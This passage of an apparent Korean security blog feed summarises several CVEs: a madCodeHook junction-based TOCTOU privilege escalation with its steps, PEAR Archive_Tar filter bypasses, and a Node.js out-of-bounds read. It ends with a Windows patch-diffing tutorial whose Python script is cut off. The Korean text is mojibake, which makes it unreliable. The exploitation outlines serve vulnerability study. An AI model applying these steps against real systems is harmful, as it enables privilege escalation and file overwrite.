    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHookì€ ë‹¤ì–‘í•œ API hooking ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” third party ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. madCodeHookë¼ì´ë¸ŒëŸ¬ë¦¬ì— í¬í•¨ëœ <code>ExprevDriver.sys</code>ë¼ëŠ” ë“œë¼ì´ë²„ëŠ” ìœ ì € ëª¨ë“œ í”„ë¡œì„¸ìŠ¤ì— <code>Protector32.dll</code> í˜¹ì€ <code>Protector64.dll</code>ì„ ì‚½ì…í•´ ê·¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´í˜¸ ë° ê°ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. DLL injection ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ê¸°ëŠ¥ê³¼ í”„ë¡œì„¸ìŠ¤ ëª¨ë‹ˆí„°ë§ ê¸°ëŠ¥ì„ ì œê³µí•˜ë¯€ë¡œ ëª‡ëª‡ ë³´ì•ˆ ì œí’ˆì—ì„œ madCodeHook ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>ì•„ì´ëŸ¬ë‹ˆí•˜ê²Œë„ DLL injectionì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” <code>ExprevDriver.sys</code> ë“œë¼ì´ë²„ì— path redirectionì„ ì´ìš©í•œ toctou ì·¨ì•½ì ì´ ì¡´ì¬í•˜ê³ , í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ DLL injectionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>ì‹¤ì œ  <code>Protector64.dll</code>ì´ ì¡´ì¬í•˜ëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ” juctionì„ ìƒì„±í•©ë‹ˆë‹¤.</p><pre><code class="hljs powershell">â€œmklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprevâ€</code></pre></li><li><p><code>ExprevDriver.sys</code>ì— IOCTLì„ ë„˜ê²¨ì¤ë‹ˆë‹¤.</p><pre><code class="hljs latex">â€œC:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dllâ€</code></pre><p>IOCTLì„ ì‚¬ìš©í•´  <code>ExprevDriver.sys</code>ê°€ ì‚½ì…í•  DLLì˜ ê²½ë¡œì™€ ëŒ€ìƒ í”„ë¡œì„¸ìŠ¤ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  <code>ExprevDriver.sys</code>ëŠ” DLLì„ ì‚½ì…í•˜ê¸° ì „ì— DLLì˜ ì „ìì„œëª…ì„ ê²€ì¦í•˜ëŠ” ë‹¨ê³„ë¥¼ ê±°ì¹˜ëŠ”ë°,  IOCTLë¡œ ì„¤ì •ëœ ê²½ë¡œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. Protector64.dllì˜ ê²½ë¡œë¥¼ 1ë²ˆì—ì„œ ë§Œë“¤ì–´ ë‘” juctionìœ¼ë¡œ ì„¤ì •í•´ì¤ë‹ˆë‹¤.</p></li><li><p>ë””ë ‰í„°ë¦¬ juctionì„ ì‚­ì œí•˜ê³  ê°€ì§œ <code>Protector64.dll</code>ì„ ìƒì„±í•©ë‹ˆë‹¤.</p><p>DLLì˜ ì „ìì„œëª… ê²€ì¦ ì´í›„ juctionì„ ì‚­ì œí•˜ê³  2ë²ˆ ë‹¨ê³„ì—ì„œ ì§€ì •í•´ì¤€ ê²½ë¡œì— <code>Protector64.dll</code>ë¼ëŠ” ì´ë¦„ì˜ ì•…ì„± DLLì„ ìƒì„±í•©ë‹ˆë‹¤.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>lpe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
    <link href="/2020/12/01/l0ch/2020-12-01/"/>
    <url>/2020/12/01/l0ch/2020-12-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_TarëŠ” PHPì—ì„œ TAR íŒŒì¼ì„ ì²˜ë¦¬í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ phar unseirializationê³¼ arbitrary file overwrite ë‘ ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><br>ì²« ë²ˆì§¸ ì·¨ì•½ì (CVE-2020-28948)ì€ scheme í•„í„°ë§ ìš°íšŒë¥¼ í†µí•œ unserialization ì·¨ì•½ì ì…ë‹ˆë‹¤.<p>Archive_Tarì—ëŠ” unserialization ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ê·¸ëŸ¬ë‚˜ <code>PHAR://malicious_file.phar</code> ê³¼ ê°™ì´ ëŒ€ë¬¸ìë¡œ ì‘ì„±í•˜ë©´ í•´ë‹¹ ì½”ë“œë¥¼ ìš°íšŒí•´ unserializationì„ í†µí•œ obejct injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.<br><br></p><p>ë‘ ë²ˆì§¸ ì·¨ì•½ì (CVE-2020-28949)ì€ Archive_Tarì—ì„œ stream wrapperë¥¼ ì²´í¬í•˜ì§€ ì•Šì•„ ë°œìƒí•˜ëŠ” arbitrary file overwrite ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì  ë˜í•œ CVE-2020-28948ê³¼ ê°™ì€ ì½”ë“œì—ì„œ ë°œìƒí•œ ì·¨ì•½ì ìœ¼ë¡œ, <code>file://</code> schemeì— ëŒ€í•œ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„ í•´ì»¤ê°€ ì„ì˜ íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. phpê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ì—ˆë‹¤ë©´ <code>/etc/passwd</code> íŒŒì¼ì„ í¬í•¨í•œ ì‹œìŠ¤í…œ íŒŒì¼ ë˜í•œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ì´ ë‘ ì·¨ì•½ì ì€ ë¬¸ìì—´ì— <code>phar://</code> ê°€ ì•„ë‹Œ <code>://</code> ê°€ í¬í•¨ë  ê²½ìš° ì´ë¥¼ í•„í„°ë§í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>unserialization</tag>
      
      <tag>arbitrary file overwrite</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8277: Node.js OOB Readë¥¼ í†µí•œ Denial of Service</title>
    <link href="/2020/11/30/idioth/2020-11-30/"/>
    <url>/2020/11/30/idioth/2020-11-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.jsì—ì„œ OOB(Out of Bounds) Readë¥¼ í†µí•´ Denial of Serviceë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ë§ì€ ì–‘ì˜ DNS recordë¥¼ <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares ë¼ì´ë¸ŒëŸ¬ë¦¬</a>ì—ì„œ TTL recordë¥¼ parsing í•  ë•Œ ë°°ì—´ ê¸¸ì´ì˜ ê³„ì‚°ì„ ì˜ëª»í•˜ë©´ì„œ ì¼ì–´ë‚˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>c-ares ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>ares_parse_aaaa_reply</code> í•¨ìˆ˜ëŠ” responseë¥¼ í¬í•¨í•˜ëŠ” <code>char* abuffer</code>, responseì˜ ê¸¸ì´ì¸ <code>alen</code>, DNS responseê°€ ë°˜í™˜ë  êµ¬ì¡°ì²´ í¬ì¸í„° <code>host</code>, TTL ë°°ì—´ì¸ <code>addrttls / naddrttls</code>ë¥¼ ì¸ìë¡œ ê°–ìŠµë‹ˆë‹¤. <code>addrttls</code>ëŠ” ë°˜í™˜ëœ TTLì˜ ì£¼ì†Œë¡œ ì±„ì›Œì§€ëŠ” ë°°ì—´ì´ê³ , <code>naddrttls</code>ëŠ” ë°˜í™˜í•  TTLì˜ ìµœëŒ€ ê°’ì…ë‹ˆë‹¤. responseì˜ reply ê°œìˆ˜ê°€ <code>addrttls</code> ë°°ì—´ë³´ë‹¤ í´ ê²½ìš°  <code>naddrttls</code>ì—ì„œ í™•ì¸ í›„ 256ê°œì˜ TTLë§Œ ì²˜ë¦¬ë˜ê³  ë‚˜ë¨¸ì§€ ë¶€ë¶„ì€ ì˜ë¦¬ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì·¨ì•½ì ì€ TTLì˜ ê°œìˆ˜ì— ëŒ€í•œ ì˜ëª»ëœ ì²˜ë¦¬ê°€ ì•„ë‹ˆë¼ responseì˜ reply ê°œìˆ˜ë¥¼ ì˜ëª» ê³„ì‚°í•˜ëŠ” ê²ƒì—ì„œ ì¼ì–´ë‚©ë‹ˆë‹¤.</p><ol><li>replyì˜ ê°œìˆ˜ë¥¼ ìƒˆì„œ <code>naddrs</code>ì— ì €ì¥</li><li>TTL ë°°ì—´ ì‘ì„±(<code>naddrttls</code>ì— ì˜í•´ ì˜ë¦° <code>addrttls</code>)</li><li><code>naddrttls</code> ì¬ì‘ì„± - ì‹¤ì œ TTL ë°°ì—´ì— ì‘ì„±ëœ ê°’ë³´ë‹¤ í° ì§€ í™•ì¸í•˜ì§€ ì•Šê³  <code>naddrs</code>ë¥¼ ì§‘ì–´ë„£ìŒ</li></ol><p>ë”°ë¼ì„œ ë°˜í™˜ëœ <code>naddrttls</code>ê°€ ì‘ì„±ëœ replyì˜ TTL ê°œìˆ˜ë³´ë‹¤ ì»¤ì§€ë¯€ë¡œ OOB readê°€ ê°€ëŠ¥í•˜ê³  ì´ë¥¼ ì•…ìš©í•˜ì—¬ Denial of Service ê³µê²©ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>naddrttls</code>ì— <code>naddrs</code> ê°’ì„ ë„£ì„ ë•Œ <code>naddrs</code>ì˜ ê°’ì´ <code>naddrttls</code>ë³´ë‹¤ í´ ê²½ìš° <code>naddrttls</code> ê°’ì„ ë„£ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>dos</tag>
      
      <tag>node.js</tag>
      
      <tag>oob read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing ë§›ë³´ê¸° Part 2</title>
    <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
    <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš” ì—¬ëŸ¬ë¶„! L0chì…ë‹ˆë‹¤. ì§€ë‚œ Windows Patch Diffingê¸€ì˜ ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨ë¡œ íŒŒíŠ¸ 1ì— ì´ì–´ íŒŒíŠ¸ 2ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing ë§›ë³´ê¸° Part 1</a></p><p>ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ ì¶”ì¶œë„ í–ˆìœ¼ë‹ˆ ì´ì œ ì§„ì§œ íŒ¨ì¹˜ diffingì„ ì‹œì‘â€¦í•˜ê¸° ì „ì—! í•´ì•¼ í• ê²Œ í•œ ê°€ì§€ ë” ë‚¨ì•„ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>ì•„ë‹ˆ ê·¸ëŸ¼ diffingì€ ëŒ€ì²´ ì–¸ì œ í•¨?</p></blockquote><p>ìœˆë„ìš°ì—ì„œ íŒ¨ì¹˜ë¥¼ í•  ë•Œ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ í•˜ëŠ”ì§€ë¥¼ ë¨¼ì € ì•Œì•„ë´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë˜ì•¼ diffing í•  ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆì–´ìš” ã…ã…</p><h1 id="íŒ¨ì¹˜-íŒŒì¼-ìœ í˜•"><a href="#íŒ¨ì¹˜-íŒŒì¼-ìœ í˜•" class="headerlink" title="íŒ¨ì¹˜ íŒŒì¼ ìœ í˜•"></a>íŒ¨ì¹˜ íŒŒì¼ ìœ í˜•</h1><p>ì´ì „ ê¸€ì—ì„œ ì¶”ì¶œí•œ null, forward, reverse differentialì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì‚´í´ë´¤ì—ˆì£ . ì´ diff ìœ í˜•ì˜ íŒŒì¼ë“¤ì€ diffing í•  ë²„ì „ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•˜ëŠ” ë° ì•„ë˜ì™€ ê°™ì€ ì—­í• ì„ í•©ë‹ˆë‹¤.</p><ul><li><p>Forward diff</p><ul><li>ê¸°ë³¸ ë°”ì´ë„ˆë¦¬ (.1)ë¥¼ íŠ¹ì • íŒ¨ì¹˜ ìˆ˜ì¤€ê¹Œì§€ ê°€ì ¸ì˜µë‹ˆë‹¤.</li></ul></li><li><p>Reverse diff</p><ul><li>íŒ¨ì¹˜ê°€ ì ìš©ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ê¸°ë³¸ ë°”ì´ë„ˆë¦¬ (.1)ë¡œ ë¡¤ë°±í•©ë‹ˆë‹¤.</li></ul></li><li><p>NULL diff</p><ul><li><p>íŒ¨ì¹˜ì—ì„œ ìƒˆ íŒŒì¼ì´ ì¶”ê°€ë  ê²½ìš° ì‚¬ìš©ë©ë‹ˆë‹¤.</p></br></li></ul></li></ul><p>diff íŒŒì¼ì„ ì´ìš©í•œ Windowsì˜ íŒ¨ì¹˜ ê³¼ì •ì…ë‹ˆë‹¤. </p><ol><li>ê¸°ì¡´ ë°”ì´ë„ˆë¦¬ ë²„ì „ì— ë§ëŠ” reverse diff íŒŒì¼ë¡œ ë¸íƒ€ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±</li><li>íŒ¨ì¹˜ íŒ¨í‚¤ì§€ì—ì„œ ì¶”ì¶œí•œ forward diff íŒŒì¼ë¡œ ë¸íƒ€ íŒ¨ì¹˜</li></ol><ul><li><p>NULL diffì¼ ê²½ìš° íŒ¨ì¹˜í•  ê²½ë¡œì— ë³µì‚¬</p></br></li></ul><p>ìš°ë¦¬ê°€ diffing í•  ë°”ì´ë„ˆë¦¬ë¥¼ êµ¬í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>C:\system32\WinSxS</code> ì—ì„œ diffing í•  ë°”ì´ë„ˆë¦¬ë¥¼ ì°¾ìŠµë‹ˆë‹¤. WinSxSì—ëŠ” diff íŒŒì¼ë¿ë§Œ ì•„ë‹ˆë¼ í•´ë‹¹ ë²„ì „ì˜ ë°”ì´ë„ˆë¦¬ë„ í•¨ê»˜ ë“¤ì–´ìˆìŠµë‹ˆë‹¤.</li><li>í•´ë‹¹ ë²„ì „ì˜ reverse diffë¡œ ë¸íƒ€ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ ë°”ì´ë„ˆë¦¬ë¡œ ë¡¤ë°±í•©ë‹ˆë‹¤.</li><li>ì¶”ì¶œí•œ íŒ¨ì¹˜ íŒŒì¼ì—ì„œ íŒ¨ì¹˜í•  ë²„ì „ì˜ forward diffë¡œ ë¸íƒ€ íŒ¨ì¹˜ë¥¼ í•©ë‹ˆë‹¤.</li><li>íŒ¨ì¹˜ëœ ë°”ì´ë„ˆë¦¬ì˜ hashë¥¼ êµ¬í•˜ê³  manifest hashì™€ ë¹„êµí•´ ì •ìƒì ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</li></ol><h1 id="íŒ¨ì¹˜-ì ìš©"><a href="#íŒ¨ì¹˜-ì ìš©" class="headerlink" title="íŒ¨ì¹˜ ì ìš©"></a>íŒ¨ì¹˜ ì ìš©</h1><p><code>ntoskrnl.exe</code> ì˜ ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•´ì„œ diffing í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><p>diffing ëŒ€ìƒ ì„ ì •ì€ ì·¨ì•½ì  ì •ë³´ì™€ í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ë³´ê³  íŒë‹¨í•˜ë©´ ë˜ê² ìŠµë‹ˆë‹¤.</p><p>powershellì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë©´ WinSxSì— ì—…ë°ì´íŠ¸ëœ ë²„ì „ë³„ differential íŒŒì¼ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>í™˜ê²½ë§ˆë‹¤ ëˆ„ì ëœ ì—…ë°ì´íŠ¸ê°€ ë‹¬ë¼ì„œ ê²°ê³¼ëŠ” ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  í˜„ì¬ ì œ ìœˆë„ìš° ì‹œìŠ¤í…œì˜ <code>ntoskrnl.exe</code> ë²„ì „ì¸ 10.0.18362.1082ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì§„í–‰í•´ ë³¼ê²Œìš”.</p><p>í˜„ì¬ ntoskrnl.exe ë²„ì „ - 10.0.18362.1082</p><p>ì¶”ì¶œí•œ ntoskrnl.exe ë²„ì „ - 10.0.18362.1016</p><p>1082 ë²„ì „ì€ ì œ ì‹œìŠ¤í…œì— ì´ë¯¸ ìˆìœ¼ë‹ˆ 1016 ë²„ì „ì„ ë¸íƒ€ íŒ¨ì¹˜ë¡œ ìƒì„±í•´ë³´ê² ìŠµë‹ˆë‹¤!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff íŒ¨ì¹˜ì—ëŠ” msì—ì„œ ì§€ì›í•˜ëŠ” patch APIì¸ <code>msdelta.dll</code> ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>Vista ì´ìƒ Windowsì—ì„œëŠ” <code>msdelta.dll</code> ì´ ê¸°ë³¸ì ìœ¼ë¡œ ë‚´ì¥ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ê°€ì ¸ë‹¤ê°€ ì“°ê¸°ë§Œ í•˜ë©´ ë˜ì£  ã…ã…</p><p>ì•„ë˜ëŠ” íŒŒì´ì¬ì„ ì‚¬ìš©í•´ ì‘ì„±í•œ msdelta íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span 